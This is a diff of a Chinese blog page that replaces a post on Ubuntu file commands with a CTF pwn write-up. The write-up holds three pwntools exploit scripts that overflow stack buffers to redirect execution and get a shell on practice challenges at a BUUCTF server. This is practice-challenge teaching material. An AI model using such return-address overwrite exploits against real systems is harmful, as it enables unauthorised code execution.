@@ -20,20 +20,24 @@
     var CONFIG = {"hostname":"dh15219984801.store","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="​                                                         查看文件：cat 路径名 进入文件夹操作： 当前位置       cd . 上一级文件位置 cd .. 返回上一步操作 cd - 进入Home文件  cd ~ 显示文件路径   pwd 文件及文件夹操作： 创建文件 touch  创建文件夹 mkdir  创建多重文件夹 mkdir">
+  <meta name="description" content="​                                                                      wustctf2020_getshellexps 1234567891011121314151617181920from pwn import *context.log_level &#x3D; &amp;#x27;debug&amp;#x27;def debug_pause():">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Ubuntu 16.04 文件及文件夹基础操作">
-<meta property="og:url" content="https://dh15219984801.store/2020/11/06/title%20Ubuntu%2016.04%20%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E5%A4%B9%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/index.html">
+<meta property="og:title" content="BUUCTF做题记录（一）">
+<meta property="og:url" content="https://dh15219984801.store/2020/11/05/pwn/title%20BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="蜗牛的小屋">
-<meta property="og:description" content="​                                                         查看文件：cat 路径名 进入文件夹操作： 当前位置       cd . 上一级文件位置 cd .. 返回上一步操作 cd - 进入Home文件  cd ~ 显示文件路径   pwd 文件及文件夹操作： 创建文件 touch  创建文件夹 mkdir  创建多重文件夹 mkdir">
+<meta property="og:description" content="​                                                                      wustctf2020_getshellexps 1234567891011121314151617181920from pwn import *context.log_level &#x3D; &amp;#x27;debug&amp;#x27;def debug_pause():">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-11-05T16:32:19.148Z">
-<meta property="article:modified_time" content="2020-11-06T02:38:36.554Z">
+<meta property="og:image" content="https://i.loli.net/2020/11/05/KwaTOD3yJfxRNkX.png">
+<meta property="og:image" content="https://i.loli.net/2020/11/05/8yc7Q4LstzUEre9.png">
+<meta property="og:image" content="https://i.loli.net/2020/11/13/Ib35s98ALqBma2p.png">
+<meta property="article:published_time" content="2020-11-05T15:36:21.593Z">
+<meta property="article:modified_time" content="2020-11-13T14:45:15.001Z">
 <meta property="article:author" content="Theothershore">
 <meta property="article:tag" content="CTF-pwn">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/11/05/KwaTOD3yJfxRNkX.png">
 
-<link rel="canonical" href="https://dh15219984801.store/2020/11/06/title%20Ubuntu%2016.04%20%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E5%A4%B9%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/">
+<link rel="canonical" href="https://dh15219984801.store/2020/11/05/pwn/title%20BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
 
 
 <script id="page-configurations">
@@ -46,7 +50,7 @@
   };
 </script>
 
-  <title>Ubuntu 16.04 文件及文件夹基础操作 | 蜗牛的小屋</title>
+  <title>BUUCTF做题记录（一） | 蜗牛的小屋</title>
   
 
 
@@ -164,7 +168,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://dh15219984801.store/2020/11/06/title%20Ubuntu%2016.04%20%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E5%A4%B9%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/">
+    <link itemprop="mainEntityOfPage" href="https://dh15219984801.store/2020/11/05/pwn/title%20BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/001.jpg">
@@ -177,7 +181,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Ubuntu 16.04 文件及文件夹基础操作
+          BUUCTF做题记录（一）
         </h1>
 
         <div class="post-meta">
@@ -186,13 +190,19 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-11-06 00:32:19 / 修改时间：10:38:36" itemprop="dateCreated datePublished" datetime="2020-11-06T00:32:19+08:00">2020-11-06</time>
+              <time title="创建时间：2020-11-05 23:36:21" itemprop="dateCreated datePublished" datetime="2020-11-05T23:36:21+08:00">2020-11-05</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-11-13 22:45:15" itemprop="dateModified" datetime="2020-11-13T22:45:15+08:00">2020-11-13</time>
+              </span>
 
           
-            <span id="/2020/11/06/title%20Ubuntu%2016.04%20%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E5%A4%B9%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/" class="post-meta-item leancloud_visitors" data-flag-title="Ubuntu 16.04 文件及文件夹基础操作" title="阅读次数">
+            <span id="/2020/11/05/pwn/title%20BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-meta-item leancloud_visitors" data-flag-title="BUUCTF做题记录（一）" title="阅读次数">
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
@@ -209,20 +219,20 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>​                                                        </p>
-<p><strong>查看文件：cat 路径名</strong></p>
-<p><strong>进入文件夹操作：</strong></p>
-<p>当前位置       cd .</p>
-<p>上一级文件位置 cd ..</p>
-<p>返回上一步操作 cd -</p>
-<p>进入Home文件  cd ~</p>
-<p>显示文件路径   pwd</p>
-<p><strong>文件及文件夹操作：</strong></p>
-<p>创建文件 touch <file></p>
-<p>创建文件夹 mkdir <dir></p>
-<p>创建多重文件夹 mkdir -p <dir></p>
-<p>删除文件 rm <file></p>
-<p>删除文件夹 rmdir <dir></p>
+        <p>​                                                                     </p>
+<h2 id="wustctf2020-getshell"><a href="#wustctf2020-getshell" class="headerlink" title="wustctf2020_getshell"></a>wustctf2020_getshell</h2><p>exps</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug_pause</span>():</span></span><br><span class="line">    log.info(proc.pidof(p))</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proc_name = <span class="string">&#x27;./wustctf2020_getshell&#x27;</span></span><br><span class="line">p = process(proc_name)</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27332</span>)</span><br><span class="line">elf = ELF(proc_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell = elf.sym[<span class="string">&#x27;shell&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x18</span> + <span class="number">0x4</span>) + p32(shell)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/11/05/KwaTOD3yJfxRNkX.png" alt="image.png"></p>
+<h2 id="picoctf-2018-buffer-overflow-1"><a href="#picoctf-2018-buffer-overflow-1" class="headerlink" title="picoctf_2018_buffer_overflow_1"></a>picoctf_2018_buffer_overflow_1</h2><p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn = process(<span class="string">&quot;./buffer_overflow_1&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25257</span> )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn.recvuntil(<span class="string">&quot;Please enter your string: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Addr = <span class="number">0x080485CB</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x28</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x4</span> + p32(Addr)</span><br><span class="line"></span><br><span class="line">pwn.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/11/05/8yc7Q4LstzUEre9.png" alt="image.png"></p>
+<h2 id="bbys-tu-2016"><a href="#bbys-tu-2016" class="headerlink" title="bbys_tu_2016"></a>bbys_tu_2016</h2><p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bbys_tu_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25390</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">0x4</span>+<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(<span class="number">0x0804856D</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/11/13/Ib35s98ALqBma2p.png" alt="image.png"></p>
+<p>注：本题文flag的控制权限，因此不需要cat flag</p>
 
     </div>
 
@@ -238,11 +248,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/11/05/title%20BUUCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="prev" title="BUUCTF做题记录（一）">
-      <i class="fa fa-chevron-left"></i> BUUCTF做题记录（一）
+    <a href="/2020/10/20/Ubutun16.04/unbutu%E6%9D%83%E9%99%90%E4%B8%8D%E5%A4%9F/" rel="prev" title="unbutu权限不够">
+      <i class="fa fa-chevron-left"></i> unbutu权限不够
     </a></div>
       <div class="post-nav-item">
-    <a href="/2020/11/11/title%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="next" title="字符串">
+    <a href="/2020/11/11/c%E8%AF%AD%E8%A8%80/title%E5%AD%97%E7%AC%A6%E4%B8%B2/" rel="next" title="字符串">
       字符串 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -303,6 +313,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#wustctf2020-getshell"><span class="nav-number">1.</span> <span class="nav-text">wustctf2020_getshell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#picoctf-2018-buffer-overflow-1"><span class="nav-number">2.</span> <span class="nav-text">picoctf_2018_buffer_overflow_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bbys-tu-2016"><span class="nav-number">3.</span> <span class="nav-text">bbys_tu_2016</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
